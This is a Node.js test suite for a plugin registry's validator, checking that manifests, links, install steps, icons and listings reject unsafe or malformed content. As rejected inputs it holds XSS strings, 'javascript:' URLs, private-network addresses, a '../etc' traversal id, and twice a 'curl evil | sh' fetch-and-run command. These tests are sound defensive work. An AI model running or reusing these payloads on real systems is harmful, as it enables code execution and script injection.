// What a listing has to be. Each test is a way a listing could go wrong - carelessly or on
// purpose - and the sentence a reviewer would otherwise have to remember to check.

import assert from 'node:assert/strict';
import { after, describe, it } from 'node:test';
import { checkIcon, checkListing, checkManifest, checkTemplates, hostProblem, loadRegistry } from '../scripts/lib/registry.mjs';
import { COMMIT, listing, makePng, makeRegistry, manifest } from './helpers.mjs';

const cleanup = [];
const registry = (...args) => {
  const made = makeRegistry(...args);
  cleanup.push(made.remove);
  return made;
};
after(() => cleanup.forEach((remove) => remove()));

const problems = (m) => checkManifest(m);
const says = (list, fragment) => list.some((e) => e.includes(fragment));

describe('a good manifest', () => {
  it('passes', () => {
    assert.deepEqual(problems(manifest()), []);
  });

  it('may carry every optional field', () => {
    const full = manifest('sample', {
      homepage: 'https://example.com/',
      issues: 'https://github.com/sample-author/fmm-sample/issues',
      categories: ['smart-home', 'automation', 'notifications'],
      permissions: [
        { scope: 'state:read', reason: 'Shows how much time is left.' },
        { scope: 'timer:start', reason: 'Lets a button start the timer.' },
        { scope: 'timer:extend', reason: 'Lets a button add five minutes.' },
        { scope: 'timer:stop', reason: 'Lets a button end the time now.' },
        { scope: 'timer:cancel', reason: 'Lets a button let go of the timer.' },
      ],
    });
    assert.deepEqual(problems(full), []);
  });
});

describe('what a plugin may ask for', () => {
  it('only the permissions a key can have', () => {
    for (const scope of ['admin', '*', 'household:read', 'keys:create', 'devices:list', 'State:Read']) {
      const m = manifest('sample', { permissions: [{ scope, reason: 'Because it says so, honestly.' }] });
      assert.ok(problems(m).length > 0, `${scope} should be refused`);
    }
  });

  it('each permission once', () => {
    const m = manifest('sample', {
      permissions: [
        { scope: 'state:read', reason: 'Shows how much time is left.' },
        { scope: 'state:read', reason: 'Shows it again, for some reason.' },
      ],
    });
    assert.ok(says(problems(m), "'state:read' is listed more than once"));
  });

  it('at least one, and every one with a reason a parent can weigh', () => {
    assert.ok(problems(manifest('sample', { permissions: [] })).length > 0);
    assert.ok(problems(manifest('sample', { permissions: [{ scope: 'state:read', reason: 'x' }] })).length > 0);
    assert.ok(problems(manifest('sample', { permissions: [{ scope: 'state:read' }] })).length > 0);
  });
});

describe('nothing that could be read as markup or code', () => {
  for (const field of ['name', 'description']) {
    it(`${field} cannot contain angle brackets`, () => {
      const bad = field === 'name' ? 'Sample <b>bold</b>' : 'A perfectly friendly description <script>alert(1)</script> of a plugin.';
      assert.ok(problems(manifest('sample', { [field]: bad })).length > 0);
    });
  }

  it('an install step cannot either, in its title or its text', () => {
    const step = (patch) => manifest('sample', { install: { steps: [{ title: 'Run it', text: 'Start it up now.', code: '{{API_KEY}}', ...patch }] } });
    assert.ok(problems(step({ title: '<img src=x onerror=alert(1)>' })).length > 0);
    assert.ok(problems(step({ text: 'Open <a href="x">this</a> page' })).length > 0);
  });

  it('but a code block may, because code contains them', () => {
    const m = manifest('sample', { install: { steps: [{ title: 'Run it', text: 'Start it up now.', code: 'echo "<name>" {{API_KEY}}' }] } });
    assert.deepEqual(problems(m), []);
  });

  it('control characters are refused', () => {
    assert.ok(problems(manifest('sample', { name: 'Sam\u0007ple' })).length > 0);
    assert.ok(problems(manifest('sample', { description: 'Starts and watches the timer.\u0000 and more words' })).length > 0);
  });
});

describe('links', () => {
  const withDocs = (documentation) => problems(manifest('sample', { documentation }));

  it('must be https', () => {
    for (const url of ['http://example.com/docs', 'ftp://example.com/x', 'javascript:alert(1)', 'data:text/html,hi', '//example.com/x']) {
      assert.ok(withDocs(url).length > 0, url);
    }
  });

  it('must not point at an address on somebody’s network', () => {
    for (const url of [
      'https://192.168.1.10/docs',
      'https://10.0.0.5/',
      'https://127.0.0.1/',
      'https://localhost/docs',
      'https://printer.local/docs',
      'https://router.lan/',
      'https://intranet.internal/x',
    ]) {
      assert.ok(withDocs(url).length > 0, url);
    }
  });

  it('must not carry credentials or whitespace', () => {
    for (const url of ['https://user:pass@example.com/', 'https://example.com/a b', 'https://example.com/"x']) {
      assert.ok(withDocs(url).length > 0, url);
    }
  });

  it('in an install step are held to the same rules', () => {
    const m = manifest('sample', {
      install: { steps: [{ title: 'Read', text: 'Read the docs first.', code: '{{API_KEY}}', link: { label: 'Docs', url: 'http://example.com/' } }] },
    });
    assert.ok(problems(m).length > 0);
  });

  it('cannot smuggle a placeholder', () => {
    const m = manifest('sample', {
      install: { steps: [{ title: 'Read', text: 'Read the docs first.', code: '{{API_KEY}}', link: { label: 'Docs', url: 'https://example.com/?k={{API_KEY}}' } }] },
    });
    assert.ok(problems(m).length > 0);
  });

  it('host problems are described', () => {
    assert.equal(hostProblem('https://example.com/x'), null);
    assert.match(hostProblem('https://10.1.2.3/'), /IP address/);
    assert.match(hostProblem('https://nas.local/'), /not on the internet/);
  });
});

describe('installation instructions', () => {
  const steps = (list) => manifest('sample', { install: { steps: list } });
  const ok = { title: 'Run it', text: 'Start it up now.', code: '{{API_KEY}}' };

  it('are needed, and not endless', () => {
    assert.ok(problems(steps([])).length > 0);
    assert.ok(problems(steps(Array.from({ length: 13 }, () => ok))).length > 0);
    assert.deepEqual(problems(steps(Array.from({ length: 12 }, () => ok))), []);
  });

  it('may only fill in the two placeholders that exist', () => {
    const bad = steps([{ title: 'Run it', text: 'Start it up now.', code: '{{API_KEY}} {{HOUSEHOLD}}' }]);
    assert.ok(says(problems(bad), '{{HOUSEHOLD}}'));
  });

  it('may only fill them in inside code, where a key is copied rather than read aloud', () => {
    const bad = steps([{ title: 'Run it', text: 'Paste {{API_KEY}} into the box.', code: '{{API_KEY}}' }]);
    assert.ok(says(problems(bad), 'belongs in a code block'));
  });

  it('have to use the key somewhere, or the plugin has none', () => {
    const bad = steps([{ title: 'Run it', text: 'Start it up now.', code: 'run {{FMM_URL}}' }]);
    assert.ok(says(problems(bad), 'no step uses {{API_KEY}}'));
  });

  it('are bounded in length', () => {
    assert.ok(problems(steps([{ ...ok, text: 'x'.repeat(601) }])).length > 0);
    assert.ok(problems(steps([{ ...ok, code: 'x'.repeat(2001) }])).length > 0);
    assert.ok(problems(steps([{ ...ok, title: 'x'.repeat(81) }])).length > 0);
  });
});

describe('identity and shape', () => {
  it('an id is a slug', () => {
    for (const id of ['Home Assistant', '-lead', 'trail-', 'UPPER', 'under_score', '../etc', '']) {
      assert.ok(problems(manifest('sample', { id })).length > 0, JSON.stringify(id));
    }
  });

  it('the repository is on GitHub and is just the repository', () => {
    for (const repository of ['http://github.com/a/b', 'https://gitlab.com/a/b', 'https://github.com/a/b/', 'https://github.com/a/b.git/x', 'https://github.com/a']) {
      assert.ok(problems(manifest('sample', { repository })).length > 0, repository);
    }
  });

  it('unknown fields are refused, so nothing rides along unreviewed', () => {
    assert.ok(problems({ ...manifest(), postInstall: 'curl evil | sh' }).length > 0);
    assert.ok(problems(manifest('sample', { author: { name: 'A', script: 'x' } })).length > 0);
  });

  it('a version is a semantic version', () => {
    for (const version of ['1', '1.2', 'v1.2.3', 'latest', '1.2.3.4']) {
      assert.ok(problems(manifest('sample', { version })).length > 0, version);
    }
    assert.deepEqual(problems(manifest('sample', { version: '2.0.0-beta.1' })), []);
  });

  it('it says which API version it uses, and only 1 exists', () => {
    assert.ok(problems(manifest('sample', { compatibility: { apiVersion: 2 } })).length > 0);
    assert.ok(problems(manifest('sample', { compatibility: {} })).length > 0);
  });

  it('a category is from the list, and at most three', () => {
    assert.ok(problems(manifest('sample', { categories: ['gaming'] })).length > 0);
    assert.ok(problems(manifest('sample', { categories: ['smart-home', 'network', 'automation', 'other'] })).length > 0);
    assert.ok(problems(manifest('sample', { categories: [] })).length > 0);
  });

  it('every required field is required', () => {
    for (const field of Object.keys(manifest())) {
      const m = manifest();
      delete m[field];
      assert.ok(problems(m).length > 0 || ['homepage', 'issues'].includes(field), `${field} should be required`);
    }
  });

  it('the icon is always icon.png', () => {
    assert.ok(problems(manifest('sample', { icon: 'logo.svg' })).length > 0);
    assert.ok(problems(manifest('sample', { icon: '../icon.png' })).length > 0);
  });
});

describe('the icon', () => {
  it('a real, square PNG in range passes', () => {
    assert.deepEqual(checkIcon(makePng(256)), []);
    assert.deepEqual(checkIcon(makePng(128)), []);
    assert.deepEqual(checkIcon(makePng(512)), []);
  });

  it('SVG is refused, because it can carry script', () => {
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
    assert.ok(says(checkIcon(svg), 'not a PNG'));
  });

  it('is judged by its bytes, not by what it is called', () => {
    assert.ok(says(checkIcon(Buffer.from('GIF89a' + 'x'.repeat(60))), 'not a PNG'));
    assert.ok(says(checkIcon(Buffer.from('%PDF-1.4' + 'x'.repeat(60))), 'not a PNG'));
  });

  it('has to be square and within range', () => {
    assert.ok(says(checkIcon(makePng(256, 200)), 'square'));
    assert.ok(says(checkIcon(makePng(64)), 'between 128 and 512'));
    assert.ok(says(checkIcon(makePng(1024)), 'between 128 and 512') || says(checkIcon(makePng(1024)), 'KB'));
  });

  it('has a size limit', () => {
    assert.ok(says(checkIcon(makePng(256, 256, { pad: 120 * 1024 })), 'over the 100 KB limit'));
  });

  it('cannot be truncated or have a damaged header', () => {
    const good = makePng(256);
    assert.ok(says(checkIcon(good.subarray(0, good.length - 5)), 'truncated'));

    const damaged = Buffer.from(good);
    damaged[17] ^= 0xff;
    assert.ok(says(checkIcon(damaged), 'damaged header'));
  });

  it('cannot be missing', () => {
    assert.ok(says(checkIcon(null), 'missing'));
  });
});

describe('a listing', () => {
  const ctx = (overrides = {}) => ({ id: 'sample', manifest: manifest(), verifiedOwners: ['five-more-minutes'], ...overrides });

  it('pins a full commit, never a branch or a tag', () => {
    assert.deepEqual(checkListing(listing(), ctx()), []);
    for (const commit of ['main', 'v1.0.0', 'abc123', COMMIT.toUpperCase(), COMMIT.slice(1), `${COMMIT}0`]) {
      assert.ok(checkListing(listing('sample', { commit }), ctx()).length > 0, commit);
    }
  });

  it('points at the repository the manifest names', () => {
    const other = listing('sample', { repository: 'https://github.com/someone-else/fmm-sample' });
    assert.ok(says(checkListing(other, ctx()), 'the manifest says'));
  });

  it('is verified only for an organisation that is on the list', () => {
    assert.ok(says(checkListing(listing('sample', { verified: true }), ctx()), 'only plugins in a verified organisation'));

    const theirs = manifest('sample', { repository: 'https://github.com/five-more-minutes/fmm-sample' });
    const ok = listing('sample', { repository: theirs.repository, verified: true });
    assert.deepEqual(checkListing(ok, ctx({ manifest: theirs })), []);
  });

  it('cannot pass itself off as official', () => {
    const m = manifest('fmm-thing', { repository: 'https://github.com/sample-author/fmm-thing' });
    assert.ok(says(checkListing(listing('fmm-thing'), { id: 'fmm-thing', manifest: m, verifiedOwners: [] }), 'are for verified plugins'));

    const named = manifest('sample', { name: 'Official Five More Minutes Plugin' });
    assert.ok(says(checkListing(listing(), ctx({ manifest: named })), 'are for verified plugins'));
  });

  it('has a real date', () => {
    assert.ok(says(checkListing(listing('sample', { listedAt: '2026-02-31' }), ctx()), 'not a real date'));
    assert.ok(checkListing(listing('sample', { listedAt: 'yesterday' }), ctx()).length > 0);
  });

  it('carries nothing else', () => {
    assert.ok(checkListing({ ...listing(), approvedBy: 'me' }, ctx()).length > 0);
  });
});

describe('the registry as a whole', () => {
  it('lists what is valid', () => {
    const { root } = registry({ alpha: {}, beta: {} });
    const { plugins, errors } = loadRegistry(root);

    assert.deepEqual(errors, []);
    assert.deepEqual(plugins.map((p) => p.id), ['alpha', 'beta']);
  });

  it('insists the folder, the manifest and the listing agree on the id', () => {
    const { root } = registry({ alpha: { manifest: manifest('beta', { repository: 'https://github.com/sample-author/fmm-alpha' }) } });
    assert.ok(says(loadRegistry(root).errors, 'they have to match'));
  });

  it('refuses a folder with anything in it that should not be there', () => {
    const { root } = registry({ alpha: { extra: { 'install.sh': 'curl evil | sh', 'README.md': '# hi' } } });
    const { errors } = loadRegistry(root);

    assert.ok(says(errors, "'install.sh' is not allowed"));
    assert.ok(says(errors, "'README.md' is not allowed"));
  });

  it('reports what is missing rather than crashing', () => {
    const { root } = registry({ alpha: { manifest: null }, beta: { listing: null }, gamma: { icon: null } });
    const errors = loadRegistry(root).errors;

    assert.ok(says(errors, 'alpha: plugin.json is missing'));
    assert.ok(says(errors, 'beta: listing.json is missing'));
    assert.ok(says(errors, 'gamma/icon.png: missing'));
  });

  it('reports JSON that does not parse', () => {
    const { root } = registry({ alpha: { manifest: '{ not json' } });
    assert.ok(says(loadRegistry(root).errors, 'not valid JSON'));
  });

  it('does not let two listings share a name or a repository', () => {
    const { root } = registry({
      alpha: { manifest: manifest('alpha', { name: 'Same Name' }) },
      beta: { manifest: manifest('beta', { name: 'same name' }) },
    });
    assert.ok(says(loadRegistry(root).errors, 'has the same name'));

    const shared = 'https://github.com/sample-author/shared';
    const dup = registry({
      alpha: { manifest: manifest('alpha', { repository: shared }), listing: listing('alpha', { repository: shared }) },
      beta: { manifest: manifest('beta', { repository: shared }), listing: listing('beta', { repository: shared }) },
    });
    assert.ok(says(loadRegistry(dup.root).errors, 'has the same repository'));
  });

  it('an invalid listing does not become a listed plugin', () => {
    const { root } = registry({ good: {}, bad: { icon: Buffer.from('<svg/>') } });
    const { plugins, errors } = loadRegistry(root);

    assert.deepEqual(plugins.map((p) => p.id), ['good']);
    assert.ok(errors.length > 0);
  });
});

describe('example projects', () => {
  const template = { id: 'node', name: 'Node.js starter', description: 'A starting point in TypeScript.', language: 'TypeScript', platform: 'Node.js', repository: 'https://github.com/five-more-minutes/fmm-plugin-template-node', commit: COMMIT };

  it('are pinned to a commit like plugins', () => {
    assert.deepEqual(checkTemplates([template]), []);
    assert.ok(checkTemplates([{ ...template, commit: 'main' }]).length > 0);
  });

  it('are each listed once', () => {
    assert.ok(says(checkTemplates([template, template]), 'listed twice'));
  });

  it('carry nothing that is not described', () => {
    assert.ok(checkTemplates([{ ...template, run: 'x' }]).length > 0);
    assert.ok(checkTemplates('nope').length > 0);
  });
});
